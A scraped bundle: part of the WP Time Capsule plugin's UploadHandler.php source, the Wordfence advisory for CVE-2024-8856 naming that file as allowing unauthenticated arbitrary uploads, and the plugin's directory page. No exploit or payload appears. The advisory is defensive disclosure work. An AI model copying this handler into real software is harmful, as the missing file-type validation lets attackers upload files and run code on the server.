| [1117](#L1117) | ); |
| [1118](#L1118) | } else { |
| [1119](#L1119) | move\_uploaded\_file($uploaded\_file, $file\_path); |
| [1120](#L1120) | } |
| [1121](#L1121) | } else { |
| [1122](#L1122) | // Non-multipart uploads (PUT method support) |
| [1123](#L1123) | file\_put\_contents( |
| [1124](#L1124) | $file\_path, |
| [1125](#L1125) | fopen($this->options['input\_stream'], 'r'), |
| [1126](#L1126) | $append\_file ? FILE\_APPEND : 0 |
| [1127](#L1127) | ); |
| [1128](#L1128) | } |
| [1129](#L1129) |  |
| [1130](#L1130) | $file\_size = $this->get\_file\_size($file\_path, $append\_file); |
| [1131](#L1131) | if ($file\_size === $file->size) { |
| [1132](#L1132) | $file->url = $this->get\_download\_url($file->name); |
| [1133](#L1133) | if ($this->is\_valid\_image\_file($file\_path)) { |
| [1134](#L1134) | $this->handle\_image\_file($file\_path, $file); |
| [1135](#L1135) | } |
| [1136](#L1136) | } else { |
| [1137](#L1137) | $file->size = $file\_size; |
| [1138](#L1138) | if (!$content\_range && $this->options['discard\_aborted\_uploads']) { |
| [1139](#L1139) | unlink($file\_path); |
| [1140](#L1140) | $file->error = $this->get\_error\_message('abort'); |
| [1141](#L1141) | } |
| [1142](#L1142) | } |
| [1143](#L1143) | $this->set\_additional\_file\_properties($file); |
| [1144](#L1144) | } |
| [1145](#L1145) | return $file; |
| [1146](#L1146) | } |
| [1147](#L1147) |  |
| [1148](#L1148) | protected function readfile($file\_path) { |
| [1149](#L1149) | $file\_size = $this->get\_file\_size($file\_path); |
| [1150](#L1150) | $chunk\_size = $this->options['readfile\_chunk\_size']; |
| [1151](#L1151) | if ($chunk\_size && $file\_size > $chunk\_size) { |
| [1152](#L1152) | $handle = fopen($file\_path, 'rb'); |
| [1153](#L1153) | while (!feof($handle)) { |
| [1154](#L1154) | echo fread($handle, $chunk\_size); |
| [1155](#L1155) | @ob\_flush(); |
| [1156](#L1156) | @flush(); |
| [1157](#L1157) | } |
| [1158](#L1158) | fclose($handle); |
| [1159](#L1159) | return $file\_size; |
| [1160](#L1160) | } |
| [1161](#L1161) | return readfile($file\_path); |
| [1162](#L1162) | } |
| [1163](#L1163) |  |
| [1164](#L1164) | protected function body($str) { |
| [1165](#L1165) | echo $str; |
| [1166](#L1166) | } |
| [1167](#L1167) |  |
| [1168](#L1168) | protected function header($str) { |
| [1169](#L1169) | header($str); |
| [1170](#L1170) | } |
| [1171](#L1171) |  |
| [1172](#L1172) | protected function get\_upload\_data($id) { |
| [1173](#L1173) | return @$\_FILES[$id]; |
| [1174](#L1174) | } |
| [1175](#L1175) |  |
| [1176](#L1176) | protected function get\_post\_param($id) { |
| [1177](#L1177) | return @$\_POST[$id]; |
| [1178](#L1178) | } |
| [1179](#L1179) |  |
| [1180](#L1180) | protected function get\_query\_param($id) { |
| [1181](#L1181) | return @$\_GET[$id]; |
| [1182](#L1182) | } |
| [1183](#L1183) |  |
| [1184](#L1184) | protected function get\_server\_var($id) { |
| [1185](#L1185) | return @$\_SERVER[$id]; |
| [1186](#L1186) | } |
| [1187](#L1187) |  |
| [1188](#L1188) | protected function handle\_form\_data($file, $index) { |
| [1189](#L1189) | // Handle form data, e.g. $\_POST['description'][$index] |
| [1190](#L1190) | } |
| [1191](#L1191) |  |
| [1192](#L1192) | protected function get\_version\_param() { |
| [1193](#L1193) | return $this->basename(stripslashes($this->get\_query\_param('version'))); |
| [1194](#L1194) | } |
| [1195](#L1195) |  |
| [1196](#L1196) | protected function get\_singular\_param\_name() { |
| [1197](#L1197) | return substr($this->options['param\_name'], 0, -1); |
| [1198](#L1198) | } |
| [1199](#L1199) |  |
| [1200](#L1200) | protected function get\_file\_name\_param() { |
| [1201](#L1201) | $name = $this->get\_singular\_param\_name(); |
| [1202](#L1202) | return $this->basename(stripslashes($this->get\_query\_param($name))); |
| [1203](#L1203) | } |
| [1204](#L1204) |  |
| [1205](#L1205) | protected function get\_file\_names\_params() { |
| [1206](#L1206) | $params = $this->get\_query\_param($this->options['param\_name']); |
| [1207](#L1207) | if (!$params) { |
| [1208](#L1208) | return null; |
| [1209](#L1209) | } |
| [1210](#L1210) | foreach ($params as $key => $value) { |
| [1211](#L1211) | $params[$key] = $this->basename(stripslashes($value)); |
| [1212](#L1212) | } |
| [1213](#L1213) | return $params; |
| [1214](#L1214) | } |
| [1215](#L1215) |  |
| [1216](#L1216) | protected function get\_file\_type($file\_path) { |
| [1217](#L1217) | switch (strtolower(pathinfo($file\_path, PATHINFO\_EXTENSION))) { |
| [1218](#L1218) | case 'jpeg': |
| [1219](#L1219) | case 'jpg': |
| [1220](#L1220) | return 'image/jpeg'; |
| [1221](#L1221) | case 'png': |
| [1222](#L1222) | return 'image/png'; |
| [1223](#L1223) | case 'gif': |
| [1224](#L1224) | return 'image/gif'; |
| [1225](#L1225) | default: |
| [1226](#L1226) | return ''; |
| [1227](#L1227) | } |
| [1228](#L1228) | } |
| [1229](#L1229) |  |
| [1230](#L1230) | protected function download() { |
| [1231](#L1231) | switch ($this->options['download\_via\_php']) { |
| [1232](#L1232) | case 1: |
| [1233](#L1233) | $redirect\_header = null; |
| [1234](#L1234) | break; |
| [1235](#L1235) | case 2: |
| [1236](#L1236) | $redirect\_header = 'X-Sendfile'; |
| [1237](#L1237) | break; |
| [1238](#L1238) | case 3: |
| [1239](#L1239) | $redirect\_header = 'X-Accel-Redirect'; |
| [1240](#L1240) | break; |
| [1241](#L1241) | default: |
| [1242](#L1242) | return $this->header('HTTP/1.1 403 Forbidden'); |
| [1243](#L1243) | } |
| [1244](#L1244) | $file\_name = $this->get\_file\_name\_param(); |
| [1245](#L1245) | if (!$this->is\_valid\_file\_object($file\_name)) { |
| [1246](#L1246) | return $this->header('HTTP/1.1 404 Not Found'); |
| [1247](#L1247) | } |
| [1248](#L1248) | if ($redirect\_header) { |
| [1249](#L1249) | return $this->header( |
| [1250](#L1250) | $redirect\_header.': '.$this->get\_download\_url( |
| [1251](#L1251) | $file\_name, |
| [1252](#L1252) | $this->get\_version\_param(), |
| [1253](#L1253) | true |
| [1254](#L1254) | ) |
| [1255](#L1255) | ); |
| [1256](#L1256) | } |
| [1257](#L1257) | $file\_path = $this->get\_upload\_path($file\_name, $this->get\_version\_param()); |
| [1258](#L1258) | // Prevent browsers from MIME-sniffing the content-type: |
| [1259](#L1259) | $this->header('X-Content-Type-Options: nosniff'); |
| [1260](#L1260) | if (!preg\_match($this->options['inline\_file\_types'], $file\_name)) { |
| [1261](#L1261) | $this->header('Content-Type: application/octet-stream'); |
| [1262](#L1262) | $this->header('Content-Disposition: attachment; filename="'.$file\_name.'"'); |
| [1263](#L1263) | } else { |
| [1264](#L1264) | $this->header('Content-Type: '.$this->get\_file\_type($file\_path)); |
| [1265](#L1265) | $this->header('Content-Disposition: inline; filename="'.$file\_name.'"'); |
| [1266](#L1266) | } |
| [1267](#L1267) | $this->header('Content-Length: '.$this->get\_file\_size($file\_path)); |
| [1268](#L1268) | $this->header('Last-Modified: '.gmdate('D, d M Y H:i:s T', filemtime($file\_path))); |
| [1269](#L1269) | $this->readfile($file\_path); |
| [1270](#L1270) | } |
| [1271](#L1271) |  |
| [1272](#L1272) | protected function send\_content\_type\_header() { |
| [1273](#L1273) | $this->header('Vary: Accept'); |
| [1274](#L1274) | if (strpos($this->get\_server\_var('HTTP\_ACCEPT'), 'application/json') !== false) { |
| [1275](#L1275) | $this->header('Content-type: application/json'); |
| [1276](#L1276) | } else { |
| [1277](#L1277) | $this->header('Content-type: text/plain'); |
| [1278](#L1278) | } |
| [1279](#L1279) | } |
| [1280](#L1280) |  |
| [1281](#L1281) | protected function send\_access\_control\_headers() { |
| [1282](#L1282) | $this->header('Access-Control-Allow-Origin: '.$this->options['access\_control\_allow\_origin']); |
| [1283](#L1283) | $this->header('Access-Control-Allow-Credentials: ' |
| [1284](#L1284) | .($this->options['access\_control\_allow\_credentials'] ? 'true' : 'false')); |
| [1285](#L1285) | $this->header('Access-Control-Allow-Methods: ' |
| [1286](#L1286) | .implode(', ', $this->options['access\_control\_allow\_methods'])); |
| [1287](#L1287) | $this->header('Access-Control-Allow-Headers: ' |
| [1288](#L1288) | .implode(', ', $this->options['access\_control\_allow\_headers'])); |
| [1289](#L1289) | } |
| [1290](#L1290) |  |
| [1291](#L1291) | public function generate\_response($content, $print\_response = true) { |
| [1292](#L1292) | $this->response = $content; |
| [1293](#L1293) | if ($print\_response) { |
| [1294](#L1294) | $json = json\_encode($content); |
| [1295](#L1295) | $redirect = stripslashes($this->get\_post\_param('redirect')); |
| [1296](#L1296) | if ($redirect && preg\_match($this->options['redirect\_allow\_target'], $redirect)) { |
| [1297](#L1297) | $this->header('Location: '.sprintf($redirect, rawurlencode($json))); |
| [1298](#L1298) | return; |
| [1299](#L1299) | } |
| [1300](#L1300) | $this->head(); |
| [1301](#L1301) | if ($this->get\_server\_var('HTTP\_CONTENT\_RANGE')) { |
| [1302](#L1302) | $files = isset($content[$this->options['param\_name']]) ? |
| [1303](#L1303) | $content[$this->options['param\_name']] : null; |
| [1304](#L1304) | if ($files && is\_array($files) && is\_object($files[0]) && $files[0]->size) { |
| [1305](#L1305) | $this->header('Range: 0-'.( |
| [1306](#L1306) | $this->fix\_integer\_overflow((int)$files[0]->size) - 1 |
| [1307](#L1307) | )); |
| [1308](#L1308) | } |
| [1309](#L1309) | } |
| [1310](#L1310) | $this->body($json); |
| [1311](#L1311) | } |
| [1312](#L1312) | return $content; |
| [1313](#L1313) | } |
| [1314](#L1314) |  |
| [1315](#L1315) | public function get\_response () { |
| [1316](#L1316) | return $this->response; |
| [1317](#L1317) | } |
| [1318](#L1318) |  |
| [1319](#L1319) | public function head() { |
| [1320](#L1320) | $this->header('Pragma: no-cache'); |
| [1321](#L1321) | $this->header('Cache-Control: no-store, no-cache, must-revalidate'); |
| [1322](#L1322) | $this->header('Content-Disposition: inline; filename="files.json"'); |
| [1323](#L1323) | // Prevent Internet Explorer from MIME-sniffing the content-type: |
| [1324](#L1324) | $this->header('X-Content-Type-Options: nosniff'); |
| [1325](#L1325) | if ($this->options['access\_control\_allow\_origin']) { |
| [1326](#L1326) | $this->send\_access\_control\_headers(); |
| [1327](#L1327) | } |
| [1328](#L1328) | $this->send\_content\_type\_header(); |
| [1329](#L1329) | } |
| [1330](#L1330) |  |
| [1331](#L1331) | public function get($print\_response = true) { |
| [1332](#L1332) | if ($print\_response && $this->get\_query\_param('download')) { |
| [1333](#L1333) | return $this->download(); |
| [1334](#L1334) | } |
| [1335](#L1335) | $file\_name = $this->get\_file\_name\_param(); |
| [1336](#L1336) | if ($file\_name) { |
| [1337](#L1337) | $response = array( |
| [1338](#L1338) | $this->get\_singular\_param\_name() => $this->get\_file\_object($file\_name) |
| [1339](#L1339) | ); |
| [1340](#L1340) | } else { |
| [1341](#L1341) | $response = array( |
| [1342](#L1342) | $this->options['param\_name'] => $this->get\_file\_objects() |
| [1343](#L1343) | ); |
| [1344](#L1344) | } |
| [1345](#L1345) | return $this->generate\_response($response, $print\_response); |
| [1346](#L1346) | } |
| [1347](#L1347) |  |
| [1348](#L1348) | public function post($print\_response = true) { |
| [1349](#L1349) | if ($this->get\_query\_param('\_method') === 'DELETE') { |
| [1350](#L1350) | return $this->delete($print\_response); |
| [1351](#L1351) | } |
| [1352](#L1352) | $upload = $this->get\_upload\_data($this->options['param\_name']); |
| [1353](#L1353) | // Parse the Content-Disposition header, if available: |
| [1354](#L1354) | $content\_disposition\_header = $this->get\_server\_var('HTTP\_CONTENT\_DISPOSITION'); |
| [1355](#L1355) | $file\_name = $content\_disposition\_header ? |
| [1356](#L1356) | rawurldecode(preg\_replace( |
| [1357](#L1357) | '/(^[^"]+")|("$)/', |
| [1358](#L1358) | '', |
| [1359](#L1359) | $content\_disposition\_header |
| [1360](#L1360) | )) : null; |
| [1361](#L1361) | // Parse the Content-Range header, which has the following form: |
| [1362](#L1362) | // Content-Range: bytes 0-524287/2000000 |
| [1363](#L1363) | $content\_range\_header = $this->get\_server\_var('HTTP\_CONTENT\_RANGE'); |
| [1364](#L1364) | $content\_range = $content\_range\_header ? |
| [1365](#L1365) | preg\_split('/[^0-9]+/', $content\_range\_header) : null; |
| [1366](#L1366) | $size =  $content\_range ? $content\_range[3] : null; |
| [1367](#L1367) | $files = array(); |
| [1368](#L1368) | if ($upload) { |
| [1369](#L1369) | if (is\_array($upload['tmp\_name'])) { |
| [1370](#L1370) | // param\_name is an array identifier like "files[]", |
| [1371](#L1371) | // $upload is a multi-dimensional array: |
| [1372](#L1372) | foreach ($upload['tmp\_name'] as $index => $value) { |
| [1373](#L1373) | $files[] = $this->handle\_file\_upload( |
| [1374](#L1374) | $upload['tmp\_name'][$index], |
| [1375](#L1375) | $file\_name ? $file\_name : $upload['name'][$index], |
| [1376](#L1376) | $size ? $size : $upload['size'][$index], |
| [1377](#L1377) | $upload['type'][$index], |
| [1378](#L1378) | $upload['error'][$index], |
| [1379](#L1379) | $index, |
| [1380](#L1380) | $content\_range |
| [1381](#L1381) | ); |
| [1382](#L1382) | } |
| [1383](#L1383) | } else { |
| [1384](#L1384) | // param\_name is a single object identifier like "file", |
| [1385](#L1385) | // $upload is a one-dimensional array: |
| [1386](#L1386) | $files[] = $this->handle\_file\_upload( |
| [1387](#L1387) | isset($upload['tmp\_name']) ? $upload['tmp\_name'] : null, |
| [1388](#L1388) | $file\_name ? $file\_name : (isset($upload['name']) ? |
| [1389](#L1389) | $upload['name'] : null), |
| [1390](#L1390) | $size ? $size : (isset($upload['size']) ? |
| [1391](#L1391) | $upload['size'] : $this->get\_server\_var('CONTENT\_LENGTH')), |
| [1392](#L1392) | isset($upload['type']) ? |
| [1393](#L1393) | $upload['type'] : $this->get\_server\_var('CONTENT\_TYPE'), |
| [1394](#L1394) | isset($upload['error']) ? $upload['error'] : null, |
| [1395](#L1395) | null, |
| [1396](#L1396) | $content\_range |
| [1397](#L1397) | ); |
| [1398](#L1398) | } |
| [1399](#L1399) | } |
| [1400](#L1400) | $response = array($this->options['param\_name'] => $files); |
| [1401](#L1401) | return $this->generate\_response($response, $print\_response); |
| [1402](#L1402) | } |
| [1403](#L1403) |  |
| [1404](#L1404) | public function delete($print\_response = true) { |
| [1405](#L1405) | $file\_names = $this->get\_file\_names\_params(); |
| [1406](#L1406) | if (empty($file\_names)) { |
| [1407](#L1407) | $file\_names = array($this->get\_file\_name\_param()); |
| [1408](#L1408) | } |
| [1409](#L1409) | $response = array(); |
| [1410](#L1410) | foreach ($file\_names as $file\_name) { |
| [1411](#L1411) | $file\_path = $this->get\_upload\_path($file\_name); |
| [1412](#L1412) | $success = is\_file($file\_path) && $file\_name[0] !== '.' && unlink($file\_path); |
| [1413](#L1413) | if ($success) { |
| [1414](#L1414) | foreach ($this->options['image\_versions'] as $version => $options) { |
| [1415](#L1415) | if (!empty($version)) { |
| [1416](#L1416) | $file = $this->get\_upload\_path($file\_name, $version); |
| [1417](#L1417) | if (is\_file($file)) { |
| [1418](#L1418) | unlink($file); |
| [1419](#L1419) | } |
| [1420](#L1420) | } |
| [1421](#L1421) | } |
| [1422](#L1422) | } |
| [1423](#L1423) | $response[$file\_name] = $success; |
| [1424](#L1424) | } |
| [1425](#L1425) | return $this->generate\_response($response, $print\_response); |
| [1426](#L1426) | } |
| [1427](#L1427) |  |
| [1428](#L1428) | protected function basename($filepath, $suffix = null) { |
| [1429](#L1429) | $splited = preg\_split('/\//', rtrim ($filepath, '/ ')); |
| [1430](#L1430) | return substr(basename('X'.$splited[count($splited)-1], $suffix), 1); |
| [1431](#L1431) | } |
| [1432](#L1432) | } |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php?format=txt)
* [Original Format](/export/3222486/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.wordfence.com_e901feb4_20250115_123639.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# Backup and Staging by WP Time Capsule <= 1.22.21 - Unauthenticated Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel)   >    [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities)   >   Backup and Staging by WP Time Capsule <= 1.22.21 - Unauthenticated Arbitrary File Upload

9.8

**Unrestricted Upload of File with Dangerous Type**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2024-8856](https://www.cve.org/CVERecord?id=CVE-2024-8856) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | November 15, 2024 |
| Last Updated | November 21, 2024 |
| Researcher | [Rein Daelman (trein)](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/rein-daelman) |

### Description

The Backup and Staging by WP Time Capsule plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the the UploadHandler.php file and no direct file access prevention in all versions up to, and including, 1.22.21. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.

#### References

* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/browser/wp-time-capsule/trunk/wp-tcapsule-bridge/upload/php/UploadHandler.php)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset/3188325/)
* [plugins.trac.wordpress.org](https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=3153289%40wp-time-capsule&new=3153289%40wp-time-capsule&sfp_email=&sfph_mail=)
* [hacked.be](https://hacked.be/posts/CVE-2024-8856)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload&t=Backup%20and%20Staging%20by%20WP%20Time%20Capsule%20%3C%3D%201.22.21%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload&text=Backup%20and%20Staging%20by%20WP%20Time%20Capsule%20%3C%3D%201.22.21%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fwp-time-capsule%2Fbackup-and-staging-by-wp-time-capsule-12221-unauthenticated-arbitrary-file-upload "LinkedIn")
Email

## Vulnerability Details for Backup and Staging by WP Time Capsule

#### [Backup and Staging by WP Time Capsule](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/wp-time-capsule)

| Software Type | Plugin |
| --- | --- |
| Software Slug | wp-time-capsule [(view on wordpress.org)](https://wordpress.org/plugins/wp-time-capsule) |
| Patched? | Yes |
| Remediation | Update to version 1.22.22, or a newer patched version |
| Affected Version | * <= 1.22.21 |
| Patched Version | * 1.22.22 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE®). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from wordpress.org_f7d3694f_20250115_193657.html ===


[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [Events](https://events.wordpress.org/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* About
  + [About WordPress](https://wordpress.org/about/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
* [Get WordPress](https://wordpress.org/download/)

Search in WordPress.org

[Get WordPress](https://wordpress.org/download/)

[WordPress.org](https://wordpress.org/)

[Plugin Directory](https://wordpress.org/plugins/)

Backup and Staging by WP Time Capsule

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-time-capsule&locale=en_US)

* [Submit a plugin](https://wordpress.org/plugins/developers/)
* [My favorites](https://wordpress.org/plugins/browse/favorites/)
* [Log in](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fwordpress.org%2Fplugins%2Fwp-time-capsule&locale=en_US)

Search plugins

![](https://ps.w.org/wp-time-capsule/assets/banner-772x250.png?rev=1614914)
![](https://ps.w.org/wp-time-capsule/assets/icon-256x256.png?rev=1614914)
# Backup and Staging by WP Time Capsule

By [Revmakx](http://www.revmakx.com)

[Download](https://downloads.wordpress.org/plugin/wp-time-capsule.1.22.23.zip)

* [Details](https://wordpress.org/plugins/wp-time-capsule/#description)
* [Reviews](https://wordpress.org/plugins/wp-time-capsule/#reviews)
* [Installation](https://wordpress.org/plugins/wp-time-capsule/#installation)
* [Development](https://wordpress.org/plugins/wp-time-capsule/#developers)

[Support](https://wordpress.org/support/plugin/wp-time-capsule/)

## Description

[WP Time Capsule](https://wptimecapsule.com/ "Incremental Backup for WordPress") was created to ensure peace of mind with WP updates and put the fun back into WordPress. It uses the cloud apps’ native file versioning system to detect changes and backs up just the changed files and db entries to your account.

You need to sign up for an account on our website https://service.wptimecapsule.com to get a 30 days full featured trial.

**With WP Time Capsule you can**

**Backup in real-time**

You can backup your site in real-time which means you will now be able to revert your site to how it was just an hour ago. Also, you can change the backup interval to every 6 hours or 12 hours or daily.

**Staging**

With a single click staging it’s a breeze to test any change you are planning to do on your site. Test your updates on staging with a single click

**Auto backup and update**

We automatically backup before each update, if an update causes any undesired change. You are a click away from restoring.

**Encrypted DB backups & GDPR Compatible**

You can encrypt your DB backups to add an extra layer of security and makes your backup GDPR compatible.

**Clone/Migrate**

You can now use the WPTC backup to clone or migrate your site to a new location at ease.

**How is WP Time Capsule different than other backup plugins?**

WPTC is unique in 4 ways –

1. It backs up and restores only the changed files & DB and not the entire site every time.

2. The files & DB are stored in your cloud storage app – Amazon S3, Wasabi, Backblaze, Dropbox or Google Drive.

3. We have used the cloud apps’ native file versioning system to detect changes and maintain file versions. So backups and restores are as reliable as they get.

4. Most importantly, you can backup your site in real-time which means you will now be able to revert your site to how it was just an hour ago. Also, you can change the backup interval to every 6 hours or 12 hours or daily.

**How does it work?**

1. Sign up an account on our website https://wptimecapsule.com and you will get a 30 days full featured trial.

2. Install the plugin and login with your wptimecapsule.com account.

3. Next, connect the cloud app where you want to store the backup files. You can use Amazon S3, Wasabi, Dropbox or Google Drive.

4. Once you connect the cloud app, we will automatically begin backing up your complete website to your cloud app account.

After the first full backup is taken, you can schedule a time for WPTC to backup your websites. We will take care of your backups from here on.

This being done you will officially be *disaster-ready*. 🙂

**Backup**: Looks for files & DB changes since the last backup and uploads only the changes. The data is then stored securely in your cloud app account.

**Restore**: Checks revision history and displays the same. You can restore the site to any point in time or restore specific files & DB.

**How is it better?**

BACKUP METHOD

Traditionally – Backups are compressed and zipped. The Bad: Heavy server resource consumption.

WPTC – No zipping. Changed files are directly dropped into your cloud account. The Good: ***Uses considerably less server resources***

BACKUP FILE

Traditionally – Multiple zip files are created every time you backup. The Bad: Precious storage space is wasted.

WPTC – Backs up incrementally. No multiple copies of files. The Good: ***Uses far less disk space***

RESTORE

Traditionally – Unzip backup and restore the whole site. The Bad: Consumes time and server resource.

WPTC – Restores only selected files. The Good: ***Faster restore and you can restore even if you don’t have access to your site or plugin.***

Check out our [Knowledge Base](https://docs.wptimecapsule.com/)

Visit us at [wptimecapsule.com](https://wptimecapsule.com/ "Incremental Backup for WordPress")

Credits: Michael De Wildt for his WordPress Backup to Dropbox plugin based on which this plugin is being developed.

## Screenshots

* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-1.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-1.jpg?rev=2089781)

  **Backup calendar view** – You can view and restore files + database from a calendar view.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-2.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-2.jpg?rev=2089781)

  **Restore specific files** – View a list of files that have changed and been backed up and selectively restore them.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-3.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-3.jpg?rev=2089781)

  **Warp back your site in time** – You can restore the complete site back to a specific point in time.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-4.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-4.jpg?rev=2089781)

  **One click staging** – Set up your staging site in a single click.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-5.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-5.jpg?rev=2089781)

  **Backup Before Update** – Configure Auto and Backup Before Updates for your plugins, themes, and core to update automatically on the scheduled time.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-6.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-6.jpg?rev=2089781)

  **Database Encyption** – Encrypt your Database backup to add an extra security layer.
* [![](https://ps.w.org/wp-time-capsule/assets/screenshot-7.jpg?rev=2089781)](https://ps.w.org/wp-time-capsule/assets/screenshot-7.jpg?rev=2089781)

  **Cloning** – Use the meta SQL file from your cloud storage to clone/migrate your site to a new location.

## Installation

#### Minimum Requirements

* PHP version 5.3.1 or greater (recommended: PHP 7.2.5 or greater)
* MySQL version 5.0.15 or greater (recommended: MySQL 5.5 or greater)

#### Installation

Installing WP Time Capsule is simple and easy. Install it like any other WordPress plugin.

1. Sign up an account on our website https://wptimecapsule.com and you will get a 30 days full featured trial.
